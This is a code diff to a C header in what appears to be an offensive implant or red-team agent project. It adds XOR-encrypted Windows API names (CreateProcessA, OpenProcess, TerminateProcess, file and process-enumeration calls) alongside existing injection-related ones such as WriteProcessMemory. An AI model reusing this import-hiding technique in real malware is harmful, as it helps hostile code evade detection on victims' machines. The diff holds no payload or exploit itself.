@@ -160,6 +160,7 @@ the agent will keep reading past the name of the func.
 // // Encrypted function name (constant array), cannot macro an array in :(
 // static const BYTE FUNC_WhisperMessageBoxA_ENCRYPTED_NAME[]  = { 0x5d, 0x75, 0x63, 0x63, 0x71, 0x77, 0x75, 0x52, 0x7f, 0x68, 0x51, 0x00 };
 // static const BYTE FUNC_WhisperCreateThread_ENCRYPTED_NAME[] = { 0x53,0x62,0x75,0x71,0x64,0x75,0x44,0x78,0x62,0x75,0x71,0x74, 0x00};
+//static const BYTE FUNC_CreateProcessA_ENCRYPTED_NAME[]       = { 0x53,0x62,0x75,0x71,0x64,0x75,0x40,0x62,0x7f,0x73,0x75,0x63,0x63,0x51 0x00}
 // static const BYTE FUNC_ResumeThread_ENCRYPTED_NAME[]        = { 0x42,0x75,0x63,0x65,0x7d,0x75,0x44,0x78,0x62,0x75,0x71,0x74, 0x00};
 // static const BYTE FUNC_VirtualAllocEx_ENCRYPTED_NAME[]      = { 0x46,0x79,0x62,0x64,0x65,0x71,0x7c,0x51,0x7c,0x7c,0x7f,0x73,0x55,0x68, 0x00};
 // static const BYTE FUNC_WriteProcessMemory_ENCRYPTED_NAME[]  = { 0x47,0x62,0x79,0x64,0x75,0x40,0x62,0x7f,0x73,0x75,0x63,0x63,0x5d,0x75,0x7d,0x7f,0x62,0x69, 0x00};
@@ -187,6 +188,7 @@ the agent will keep reading past the name of the func.
 //constants for each entry, XOR'd function names
 static const BYTE FUNC_MessageBoxA_ENCRYPTED_NAME[]         = MACRO_FUNC_MessageBoxA_ENCRYPTED_NAME
 static const BYTE FUNC_CreateThread_ENCRYPTED_NAME[]        = MACRO_FUNC_CreateThread_ENCRYPTED_NAME
+static const BYTE FUNC_CreateProcessA_ENCRYPTED_NAME[]      = MACRO_FUNC_CreateProcessA_ENCRYPTED_NAME
 static const BYTE FUNC_ResumeThread_ENCRYPTED_NAME[]        = MACRO_FUNC_ResumeThread_ENCRYPTED_NAME
 static const BYTE FUNC_VirtualAllocEx_ENCRYPTED_NAME[]      = MACRO_FUNC_VirtualAllocEx_ENCRYPTED_NAME
 static const BYTE FUNC_WriteProcessMemory_ENCRYPTED_NAME[]  = MACRO_FUNC_WriteProcessMemory_ENCRYPTED_NAME
@@ -204,6 +206,27 @@ static const BYTE FUNC_GetUserNameW_ENCRYPTED_NAME[]        = MACRO_FUNC_GetUser
 static const BYTE FUNC_Sleep_ENCRYPTED_NAME[]               = MACRO_FUNC_Sleep_ENCRYPTED_NAME
 static const BYTE FUNC_WaitForSingleObject_ENCRYPTED_NAME[] = MACRO_FUNC_WaitForSingleObject_ENCRYPTED_NAME
 static const BYTE FUNC_ReadFile_ENCRYPTED_NAME[]            = MACRO_FUNC_ReadFile_ENCRYPTED_NAME
+static const BYTE FUNC_OpenProcess_ENCRYPTED_NAME[]         = MACRO_FUNC_OpenProcess_ENCRYPTED_NAME;
+static const BYTE FUNC_TerminateProcess_ENCRYPTED_NAME[]    = MACRO_FUNC_TerminateProcess_ENCRYPTED_NAME;
+static const BYTE FUNC_SuspendThread_ENCRYPTED_NAME[]       = MACRO_FUNC_SuspendThread_ENCRYPTED_NAME;
+static const BYTE FUNC_FormatMessageA_ENCRYPTED_NAME[]      = MACRO_FUNC_FormatMessageA_ENCRYPTED_NAME;
+static const BYTE FUNC_CreateToolhelp32Snapshot_ENCRYPTED_NAME[] = MACRO_FUNC_CreateToolhelp32Snapshot_ENCRYPTED_NAME;
+static const BYTE FUNC_Process32First_ENCRYPTED_NAME[]      = MACRO_FUNC_Process32First_ENCRYPTED_NAME;
+static const BYTE FUNC_Process32Next_ENCRYPTED_NAME[]       = MACRO_FUNC_Process32Next_ENCRYPTED_NAME;
+static const BYTE FUNC_GetFileSize_ENCRYPTED_NAME[]         = MACRO_FUNC_GetFileSize_ENCRYPTED_NAME;
+static const BYTE FUNC_DeleteFileA_ENCRYPTED_NAME[]         = MACRO_FUNC_DeleteFileA_ENCRYPTED_NAME;
+static const BYTE FUNC_WriteFile_ENCRYPTED_NAME[]           = MACRO_FUNC_WriteFile_ENCRYPTED_NAME;
+static const BYTE FUNC_MoveFileA_ENCRYPTED_NAME[]           = MACRO_FUNC_MoveFileA_ENCRYPTED_NAME;
+static const BYTE FUNC_CopyFileA_ENCRYPTED_NAME[]           = MACRO_FUNC_CopyFileA_ENCRYPTED_NAME;
+static const BYTE FUNC_FindFirstFileW_ENCRYPTED_NAME[]      = MACRO_FUNC_FindFirstFileW_ENCRYPTED_NAME;
+static const BYTE FUNC_FindNextFileW_ENCRYPTED_NAME[]       = MACRO_FUNC_FindNextFileW_ENCRYPTED_NAME;
+static const BYTE FUNC_FindClose_ENCRYPTED_NAME[]           = MACRO_FUNC_FindClose_ENCRYPTED_NAME;
+static const BYTE FUNC_SetCurrentDirectoryA_ENCRYPTED_NAME[]= MACRO_FUNC_SetCurrentDirectoryA_ENCRYPTED_NAME;
+static const BYTE FUNC_CreateDirectoryA_ENCRYPTED_NAME[]    = MACRO_FUNC_CreateDirectoryA_ENCRYPTED_NAME;
+static const BYTE FUNC_RemoveDirectoryA_ENCRYPTED_NAME[]    = MACRO_FUNC_RemoveDirectoryA_ENCRYPTED_NAME;
+static const BYTE FUNC_GetCurrentDirectoryA_ENCRYPTED_NAME[]= MACRO_FUNC_GetCurrentDirectoryA_ENCRYPTED_NAME;
+static const BYTE FUNC_CreateFileA_ENCRYPTED_NAME[]         = MACRO_FUNC_CreateFileA_ENCRYPTED_NAME;
+
 
 
 /*
